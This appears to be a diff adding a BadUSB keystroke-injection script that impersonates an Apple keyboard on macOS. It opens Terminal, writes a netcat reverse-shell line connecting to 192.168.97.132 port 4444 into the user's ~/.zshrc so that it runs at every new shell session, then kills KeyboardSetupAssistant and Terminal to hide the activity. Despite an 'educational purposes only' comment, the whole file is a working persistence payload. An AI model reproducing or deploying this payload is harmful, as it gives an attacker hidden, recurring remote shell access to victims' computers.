@@ -1,0 +1,30 @@
+ID abcd:1234 Apple:Keyboard
+REM This script will allow the machine to open a reverse shell access every time a new shell session is started.
+REM This is for educational purposes only
+REM Author: "Anthony V <avltree9798>"
+REM Version: 1.0
+REM Category: persistent
+
+
+DELAY 1000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+DELAY 1000
+ENTER
+DELAY 100
+STRING echo "rm /tmp/tempipes" >> ~/.zshrc
+DELAY 1000
+ENTER
+DELAY 100
+STRING echo "mkfifo /tmp/tempipes &&nc 192.168.97.132 4444 < /tmp/tempipes | /bin/bash -i > /tmp/tempipes 2>&1 | tee /tmp/tempipes > /dev/null &" >> ~/.zshrc
+DELAY 1000
+ENTER 
+DELAY 100
+STRING killall KeyboardSetupAssistant
+DELAY 1000
+ENTER
+DELAY 100
+STRING killall Terminal
+DELAY 1000
+ENTER
